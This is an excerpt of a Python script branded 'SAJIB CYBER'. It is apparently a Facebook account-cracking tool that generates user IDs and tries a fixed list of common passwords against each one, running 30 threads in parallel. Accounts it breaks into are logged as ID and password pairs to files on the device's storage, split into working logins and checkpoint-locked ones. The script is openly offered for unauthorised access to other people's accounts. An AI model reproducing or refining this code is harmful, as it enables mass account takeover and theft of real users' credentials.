...
sys.stdout.write('\x1b[1;35m\x1b]2; 彡SAJIB-404_ᏦᏆΝᏀヅ \x07')
A0="\033[1;30m"
A1="\033[1;31m"
A2="\033[1;32m"
A3="\033[1;33m"
...
logo=(f"""
Bangladesh Pakistan 
Afghanistan Napal India 
OLD Id Clone Update SC 
2025 14/07/2025 update
100% loging all old id clone 
2005/2007/2008/2009/2010/2011
working data + WiFi paid sc
 """)
...
def ffking_404():
	...
	with tred(max_workers=30) as fbck:
		...
		for fbc in user:
			uid = str(fbcx+fbc)
			pas = ['123456','123123','1234567','12345678','123456789','1689253379','52796431071','41671707651792','12087542899641']			
	...
	print(f"{A1}║{Tik} SAJIB CYBER ͲᎬᎡᎷႮХ ᎪᏞᏞ ҒᎡᎬᎬ ᏟϴᎷᎷᎪΝᎠ")
	print(f"{A1}║{Tik} SAJIB CYBER ᎪᎠᎷᏆΝ ᏴᎽ SAJIB AHMED")
	print(f"{A1}╚══════════════════════════════════════╝");exit()
...
def Fbcrack(uid,pas,tl):
	...
	sys.stdout.write(f'\r {A1}[{Clorhx}SAJIB CYBER{A1}]{Emoj}[{A6}%s{A1}]{Emj}[{A2}CP-LOCK-%s{A1}]{Emojx}[{A2}OK-ID-LOGING😘%s{A1}]\r'%(loop,len(ok),len(cp)))
	sys.stdout.flush()
	try:
		for ps in pas:
			with requests.Session() as session:
				...
				if "www.facebook.com" in str(po):
					print(f'{A6}[{A2}SAJIB CYBER-{A1}OK{A6}]{A2} {uid} {A6}◉{A2} {ps}')
					open("/sdcard/SAJIB-404_OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					cp.append(uid)
					break
				elif "access_token" in po:
					print(f'{A6}[{A2}SAJIB CYBER-CP-LOCK😭{A6}]{A2} {uid} {A6}◉{A2} {ps}')
					open("/sdcard/SAJIB_OLD-CP-LOCK😭.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					ok.append(uid)
					break
				else:pass
			loop+=1
